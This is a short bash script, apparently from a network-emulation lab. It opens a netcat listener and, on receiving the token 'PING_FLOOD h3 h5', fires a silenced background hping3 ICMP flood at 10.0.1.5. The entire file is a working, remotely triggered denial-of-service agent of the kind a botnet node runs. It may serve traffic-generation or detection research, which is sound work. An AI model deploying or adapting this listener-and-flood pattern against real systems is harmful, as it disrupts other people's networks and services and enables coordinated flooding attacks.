#!/bin/bash
PORT=7003
TARGET=10.0.1.5
IFACE=h3-eth0
TOKEN="PING_FLOOD h3 h5"

echo "[HOME2] Listener on port $PORT via $IFACE"

nc -lkp $PORT | while read -r line; do
  echo "[RX] $line"
  if [[ "$line" == *"$TOKEN"* ]]; then
    echo "[ATTACK] ICMP burst h3 → h5"
    hping3 -I $IFACE --icmp --count 2000 -i u1000 $TARGET >/dev/null 2>&1 &
  fi
done

